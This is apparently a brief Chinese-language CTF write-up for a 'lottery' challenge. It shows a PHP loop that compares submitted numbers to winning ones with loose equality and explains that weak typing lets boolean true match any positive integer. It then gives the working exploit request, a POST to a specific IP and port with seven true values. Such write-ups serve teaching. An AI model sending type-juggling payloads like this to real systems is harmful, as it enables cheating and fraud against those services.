# lottery

> 核心代码
```php
    for($i=0; $i<7; $i++){
        if($numbers[$i] == $win_numbers[$i]){
            $same_count++;
        }
    }
```

用户输入的数字的每一位与系统生成的数字进行对比，如果相等，则相等数量加一。

弱类型的PHP的true与正整数相等，所以可以用[true, true, true, true, true, true, true]来匹配。

```payload
POST http://220.249.52.133:37788/api.php

data:
{"action":"buy","numbers":[true, true, true, true, true, true, true]}
```